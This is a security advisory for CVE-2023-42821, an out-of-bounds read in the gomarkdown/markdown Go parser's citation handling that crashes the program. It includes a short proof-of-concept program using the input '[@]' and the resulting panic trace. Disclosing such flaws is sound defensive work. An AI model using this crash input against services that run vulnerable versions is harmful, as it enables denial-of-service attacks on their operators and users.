# Markdown vulnerable to Out-of-bounds Read while parsing citations

**GHSA**: GHSA-m9xq-6h2j-65r2 | **CVE**: CVE-2023-42821 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-125

**Affected Packages**:
- **github.com/gomarkdown/markdown** (go): < 0.0.0-20230922105210-14b16010c2ee

## Description

### Summary
Parsing malformed markdown input with parser that uses parser.Mmark extension could result in out-of-bounds read vulnerability.

### Details
To exploit the vulnerability, parser needs to have parser.Mmark extension set. The panic occurs inside the `citation.go` file on the line 69 when the parser tries to access the element past its length.

https://github.com/gomarkdown/markdown/blob/7478c230c7cd3e7328803d89abe591d0b61c41e4/parser/citation.go#L69

### PoC
```go
package main

import (
	"github.com/gomarkdown/markdown"
	"github.com/gomarkdown/markdown/parser"
)

func main() {
	ext := parser.CommonExtensions |
		parser.Attributes |
		parser.OrderedListStart |
		parser.SuperSubscript |
		parser.Mmark
	p := parser.NewWithExtensions(ext)

	inp := []byte("[@]")
	markdown.ToHTML(inp, p, nil)
}
```

```bash
$ go run main.go
panic: runtime error: index out of range [1] with length 1

goroutine 1 [running]:
github.com/gomarkdown/markdown/parser.citation(0x10?, {0x1400000e3f0, 0x14000141801?, 0x3}, 0x0?)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/citation.go:69 +0x544
github.com/gomarkdown/markdown/parser.link(0x14000152000?, {0x1400000e3f0?, 0x3?, 0x3?}, 0x14000141ad8?)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:308 +0x1c0
github.com/gomarkdown/markdown/parser.(*Parser).Inline(0x14000152000, {0x102d87f48, 0x14000076180}, {0x1400000e3f0, 0x3, 0x3})
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:38 +0xb8
github.com/gomarkdown/markdown/parser.(*Parser).Parse.func1({0x102d87f48?, 0x14000076180}, 0x0?)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:307 +0x8c
github.com/gomarkdown/markdown/ast.NodeVisitorFunc.Visit(0x140000106e0?, {0x102d87f48?, 0x14000076180?}, 0x68?)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:574 +0x38
github.com/gomarkdown/markdown/ast.Walk({0x102d87f48, 0x14000076180}, {0x102d87348, 0x140000106e0})
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:546 +0x58
github.com/gomarkdown/markdown/ast.Walk({0x102d877b0, 0x14000076120}, {0x102d87348, 0x140000106e0})
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:557 +0x144
github.com/gomarkdown/markdown/ast.WalkFunc(...)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:580
github.com/gomarkdown/markdown/parser.(*Parser).Parse(0x14000152000, {0x1400000e3f0?, 0x0?, 0x0?})
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:304 +0x16c
github.com/gomarkdown/markdown.Parse({0x1400000e3f0?, 0x3f?, 0x14000141e38?}, 0x102c6b43c?)
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:53 +0x6c
github.com/gomarkdown/markdown.ToHTML({0x1400000e3f0?, 0x0?, 0x60?}, 0x0?, {0x0, 0x0})
	/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:77 +0x30
main.main()
	/Users/demon/tools/markdown_cve_poc/main.go:17 +0x5c
exit status 2
```

### Impact
Denial of Service / panic

